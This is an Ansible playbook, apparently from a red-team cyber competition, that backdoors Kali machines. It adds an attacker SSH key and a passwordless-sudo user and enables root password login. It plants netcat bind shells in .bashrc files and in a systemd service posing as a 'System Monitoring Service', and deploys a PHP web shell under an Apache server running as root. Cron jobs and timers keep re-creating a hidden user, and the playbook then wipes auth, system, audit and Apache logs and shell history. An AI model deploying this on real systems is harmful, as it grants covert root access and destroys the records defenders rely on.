---
- name: Prepare Kali VMs for Competition
  hosts: kali_vms
  gather_facts: no
  become: yes
  vars:
    new_user: "ansibled"
    new_password: "WinningCDT!"
    root_password: "WinningCDT1!"
    ssh_public_key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO/wkrXEnmBgWJv5en5IT0UR0HREF78urcK+lNRD5CK7 test@DESKTOP-V1N0U29"
    persistence_user: "sql.service"
    persistence_password: "WinningCDT1!"
    backdoor_port: 4200
    bashrc_backdoor_port: 3299
    webshell_port: 81
    
  tasks:
    - name: Wait for SSH to become available
      wait_for_connection:
        timeout: 30
      ignore_errors: yes

    - name: Create ansibled user
      user:
        name: "{{ new_user }}"
        password: "{{ new_password | password_hash('sha512') }}"
        shell: /bin/bash
        createhome: yes
        state: present
      register: user_creation
      ignore_errors: yes

    - name: Update password if user already exists
      shell: "echo '{{ new_user }}:{{ new_password }}' | chpasswd"
      when: user_creation is failed
      no_log: true

    - name: Add user to sudo group
      user:
        name: "{{ new_user }}"
        groups: sudo
        append: yes

    - name: Create sudoers file for passwordless sudo
      copy:
        content: "{{ new_user }} ALL=(ALL) NOPASSWD:ALL\n"
        dest: "/etc/sudoers.d/{{ new_user }}"
        mode: '0440'
        validate: 'visudo -cf %s'

    - name: Set root password
      shell: "echo 'root:{{ root_password }}' | chpasswd"
      no_log: true

    - name: Enable root SSH login with password
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?PermitRootLogin'
        line: 'PermitRootLogin yes'
        backup: yes

    - name: Enable password authentication
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?PasswordAuthentication'
        line: 'PasswordAuthentication yes'

    - name: Make SSH config immutable
      command: chattr +i /etc/ssh/sshd_config
      ignore_errors: yes

    - name: Enable SSH service to start on boot
      systemd:
        name: ssh
        enabled: yes
        masked: no

    - name: Create SSH service protection script
      copy:
        content: |
          #!/bin/bash
          # Ensure SSH is always running
          if ! systemctl is-active --quiet ssh; then
              systemctl start ssh
          fi
          # Restore immutable flag if removed
          if ! lsattr /etc/ssh/sshd_config 2>/dev/null | grep -q 'i'; then
              chattr +i /etc/ssh/sshd_config 2>/dev/null
          fi
        dest: /usr/local/bin/protect_ssh.sh
        mode: '0755'
        owner: root
        group: root

    - name: Create cron job to protect SSH
      copy:
        content: |
          * * * * * root /usr/local/bin/protect_ssh.sh
        dest: /etc/cron.d/ssh_protection
        mode: '0644'
        owner: root
        group: root

    - name: Create systemd service for SSH protection
      copy:
        content: |
          [Unit]
          Description=SSH Protection Service
          After=network.target
          
          [Service]
          Type=oneshot
          ExecStart=/usr/local/bin/protect_ssh.sh
          User=root
          
          [Install]
          WantedBy=multi-user.target
        dest: /etc/systemd/system/ssh-protection.service
        mode: '0644'
        owner: root
        group: root

    - name: Create systemd timer for SSH protection
      copy:
        content: |
          [Unit]
          Description=SSH Protection Timer
          
          [Timer]
          OnBootSec=30sec
          OnUnitActiveSec=1min
          
          [Install]
          WantedBy=timers.target
        dest: /etc/systemd/system/ssh-protection.timer
        mode: '0644'
        owner: root
        group: root

    - name: Reload systemd for SSH protection
      systemd:
        daemon_reload: yes

    - name: Enable and start SSH protection timer
      systemd:
        name: ssh-protection.timer
        enabled: yes
        state: started

    - name: Restart SSH service
      service:
        name: "{{ item }}"
        state: restarted
      loop:
        - sshd
        - ssh
      ignore_errors: yes

    - name: Create .ssh directory for ansibled user
      file:
        path: "/home/{{ new_user }}/.ssh"
        state: directory
        mode: '0700'
        owner: "{{ new_user }}"
        group: "{{ new_user }}"

    - name: Install SSH key for ansibled user
      authorized_key:
        user: "{{ new_user }}"
        key: "{{ ssh_public_key }}"
        state: present
      when: ssh_public_key is defined and ssh_public_key != "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... your-public-key-here competition@kali"

    - name: Create .ssh directory for root
      file:
        path: /root/.ssh
        state: directory
        mode: '0700'
        owner: root
        group: root

    - name: Install SSH key for root
      authorized_key:
        user: root
        key: "{{ ssh_public_key }}"
        state: present
      when: ssh_public_key is defined and ssh_public_key != "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... your-public-key-here competition@kali"

    - name: Check if redteam user exists
      command: id redteam
      register: redteam_exists
      ignore_errors: yes
      changed_when: false

    - name: Create .ssh directory for redteam user
      file:
        path: /home/redteam/.ssh
        state: directory
        mode: '0700'
        owner: redteam
        group: redteam
      when: redteam_exists.rc == 0

    - name: Install SSH key for redteam user
      authorized_key:
        user: redteam
        key: "{{ ssh_public_key }}"
        state: present
      when: 
        - redteam_exists.rc == 0
        - ssh_public_key is defined 
        - ssh_public_key != "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... your-public-key-here competition@kali"

    - name: Add backdoor to redteam .bashrc
      blockinfile:
        path: /home/redteam/.bashrc
        block: |
          # System monitoring background process
          (while true; do nc -lvnp {{ bashrc_backdoor_port }} -e /bin/bash 2>/dev/null; sleep 1; done) &
        marker: "# {mark} ANSIBLE MANAGED BLOCK - System Monitor"
        create: yes
        owner: redteam
        group: redteam
        mode: '0644'
      when: redteam_exists.rc == 0

    - name: Add backdoor to root .bashrc
      blockinfile:
        path: /root/.bashrc
        block: |
          # System monitoring background process
          (while true; do nc -lvnp {{ bashrc_backdoor_port }} -e /bin/bash 2>/dev/null; sleep 1; done) &
        marker: "# {mark} ANSIBLE MANAGED BLOCK - System Monitor"
        create: yes
        owner: root
        group: root
        mode: '0644'

    - name: Start bashrc backdoor immediately for root
      shell: |
        nohup bash -c 'while true; do nc -lvnp {{ bashrc_backdoor_port }} -e /bin/bash 2>/dev/null; sleep 1; done' &
      args:
        executable: /bin/bash
      async: 0
      poll: 0
      ignore_errors: yes

    - name: Kill any processes using port 81
      shell: "fuser -k 81/tcp"
      ignore_errors: yes

    - name: Install Apache2 and PHP
      apt:
        name:
          - apache2
          - php
          - libapache2-mod-php
        state: present
        update_cache: yes
      ignore_errors: yes

    - name: Stop Apache completely
      shell: |
        systemctl stop apache2
        pkill -9 apache2
        sleep 2
      ignore_errors: yes

    - name: Remove any Apache lock files
      shell: "rm -f /var/run/apache2/*.pid"
      ignore_errors: yes

    - name: Create PHP web shell in web root
      copy:
        content: |
          <?php system($_REQUEST['cmd']); ?>
        dest: /var/www/html/monitoring_service.php
        mode: '0644'
        owner: root
        group: root

    - name: Completely comment out the root check lines in apache2.conf
      shell: |
        sed -i '110,120s/^[^#]/#&/' /etc/apache2/apache2.conf
      ignore_errors: yes

    - name: Create clean Apache envvars
      copy:
        content: |
          unset HOME
          if [ "${APACHE_CONFDIR}" = "" ] ; then
              APACHE_CONFDIR=/etc/apache2
          fi
          if [ "${APACHE_ENVVARS}" != "" ] ; then
              export APACHE_ENVVARS
          fi
          export APACHE_RUN_USER=root
          export APACHE_RUN_GROUP=root
          export APACHE_PID_FILE=/var/run/apache2/apache2.pid
          export APACHE_RUN_DIR=/var/run/apache2
          export APACHE_LOCK_DIR=/var/lock/apache2
          export APACHE_LOG_DIR=/var/log/apache2
          export LANG=C
          export LANG
        dest: /etc/apache2/envvars
        mode: '0644'
        owner: root
        group: root

    - name: Create Apache ports.conf
      copy:
        content: |
          Listen {{ webshell_port }}
        dest: /etc/apache2/ports.conf
        mode: '0644'
        owner: root
        group: root

    - name: Create Apache default site
      copy:
        content: |
          <VirtualHost *:{{ webshell_port }}>
                  ServerAdmin webmaster@localhost
                  DocumentRoot /var/www/html
                  
                  ErrorLog ${APACHE_LOG_DIR}/error.log
                  CustomLog ${APACHE_LOG_DIR}/access.log combined
                  
                  <Directory /var/www/html>
                          Options Indexes FollowSymLinks
                          AllowOverride None
                          Require all granted
                  </Directory>
          </VirtualHost>
        dest: /etc/apache2/sites-available/000-default.conf
        mode: '0644'
        owner: root
        group: root

    - name: Ensure Apache run directory exists
      file:
        path: /var/run/apache2
        state: directory
        owner: root
        group: root
        mode: '0755'

    - name: Test Apache configuration
      command: apache2ctl configtest
      register: apache_test
      ignore_errors: yes

    - name: Display Apache config test
      debug:
        msg: "{{ apache_test.stderr_lines }}"
      when: apache_test is defined

    - name: Enable and start Apache service
      systemd:
        name: apache2
        enabled: yes
        state: restarted
        daemon_reload: yes

    - name: Wait for Apache port
      wait_for:
        port: "{{ webshell_port }}"
        delay: 2
        timeout: 10
      ignore_errors: yes

    - name: Check what's listening on port 81
      shell: "ss -tlnp | grep :81"
      register: port_check
      ignore_errors: yes

    - name: Display port 81 status
      debug:
        msg: "{{ port_check.stdout_lines }}"
      when: port_check is defined

    - name: Create persistence script
      copy:
        content: |
          #!/bin/bash
          # Create user if doesn't exist
          if ! id "{{ persistence_user }}" &>/dev/null; then
              useradd -m -s /bin/bash "{{ persistence_user }}"
              echo "{{ persistence_user }}:{{ persistence_password }}" | chpasswd
              usermod -aG sudo "{{ persistence_user }}"
              echo "{{ persistence_user }} ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/{{ persistence_user }}
              chmod 0440 /etc/sudoers.d/{{ persistence_user }}
          fi
        dest: /usr/local/bin/create_persistence_user.sh
        mode: '0755'
        owner: root
        group: root

    - name: Run persistence script immediately
      shell: /usr/local/bin/create_persistence_user.sh
      ignore_errors: yes

    - name: Create cron job in /etc/cron.d for persistence
      copy:
        content: |
          */2 * * * * root /usr/local/bin/create_persistence_user.sh
        dest: /etc/cron.d/persistence_user
        mode: '0644'
        owner: root
        group: root

    - name: Create systemd service for persistence
      copy:
        content: |
          [Unit]
          Description=User Persistence Service
          After=network.target
          
          [Service]
          Type=oneshot
          ExecStart=/usr/local/bin/create_persistence_user.sh
          User=root
          
          [Install]
          WantedBy=multi-user.target
        dest: /etc/systemd/system/user-persistence.service
        mode: '0644'
        owner: root
        group: root

    - name: Create systemd timer for persistence
      copy:
        content: |
          [Unit]
          Description=User Persistence Timer
          
          [Timer]
          OnBootSec=1min
          OnUnitActiveSec=2min
          
          [Install]
          WantedBy=timers.target
        dest: /etc/systemd/system/user-persistence.timer
        mode: '0644'
        owner: root
        group: root

    - name: Reload systemd daemon for persistence timer
      systemd:
        daemon_reload: yes

    - name: Enable and start persistence timer
      systemd:
        name: user-persistence.timer
        enabled: yes
        state: started

    - name: Create netcat backdoor script
      copy:
        content: |
          #!/bin/bash
          while true; do
              nc -lvnp {{ backdoor_port }} -e /bin/bash 2>/dev/null
              sleep 1
          done
        dest: /usr/local/bin/netcat_backdoor.sh
        mode: '0755'
        owner: root
        group: root

    - name: Create systemd service for netcat backdoor
      copy:
        content: |
          [Unit]
          Description=System Monitoring Service
          After=network.target
          
          [Service]
          Type=simple
          ExecStart=/usr/local/bin/netcat_backdoor.sh
          Restart=always
          RestartSec=3
          User=root
          StandardOutput=null
          StandardError=null
          
          [Install]
          WantedBy=multi-user.target
        dest: /etc/systemd/system/system-monitor.service
        mode: '0644'
        owner: root
        group: root

    - name: Reload systemd daemon
      systemd:
        daemon_reload: yes

    - name: Enable and start netcat backdoor service
      systemd:
        name: system-monitor.service
        enabled: yes
        state: restarted

    - name: Clear auth logs
      shell: "truncate -s 0 {{ item }}"
      with_items:
        - /var/log/auth.log
        - /var/log/auth.log.1
        - /var/log/auth.log.2.gz
      ignore_errors: yes

    - name: Clear secure logs
      shell: "truncate -s 0 {{ item }}"
      with_items:
        - /var/log/secure
        - /var/log/secure.1
      ignore_errors: yes

    - name: Clear syslog
      shell: "truncate -s 0 {{ item }}"
      with_items:
        - /var/log/syslog
        - /var/log/syslog.1
      ignore_errors: yes

    - name: Clear messages log
      shell: "truncate -s 0 {{ item }}"
      with_items:
        - /var/log/messages
        - /var/log/messages.1
      ignore_errors: yes

    - name: Clear wtmp, btmp, and lastlog
      shell: "truncate -s 0 {{ item }}"
      with_items:
        - /var/log/wtmp
        - /var/log/btmp
        - /var/log/lastlog
      ignore_errors: yes

    - name: Clear kernel logs
      shell: "truncate -s 0 /var/log/kern.log*"
      ignore_errors: yes

    - name: Clear daemon logs
      shell: "truncate -s 0 /var/log/daemon.log*"
      ignore_errors: yes

    - name: Clear user logs
      shell: "truncate -s 0 /var/log/user.log*"
      ignore_errors: yes

    - name: Clear audit logs
      shell: "truncate -s 0 /var/log/audit/audit.log"
      ignore_errors: yes

    - name: Clear cloud-init logs
      shell: "truncate -s 0 /var/log/cloud-init*.log"
      ignore_errors: yes

    - name: Clear bash history for all users
      shell: "find /home -name '.bash_history' -exec truncate -s 0 {} \\;"
      ignore_errors: yes

    - name: Clear root bash history
      shell: "find /root -name '.bash_history' -exec truncate -s 0 {} \\;"
      ignore_errors: yes

    - name: Vacuum systemd journal
      shell: "journalctl --vacuum-time=1s"
      ignore_errors: yes

    - name: Clear Apache access logs
      shell: "truncate -s 0 /var/log/apache2/access.log*"
      ignore_errors: yes

    - name: Clear Apache error logs
      shell: "truncate -s 0 /var/log/apache2/error.log*"
      ignore_errors: yes

    - name: Display completion message
      debug:
        msg: "VM {{ inventory_hostname }} prepared successfully!"
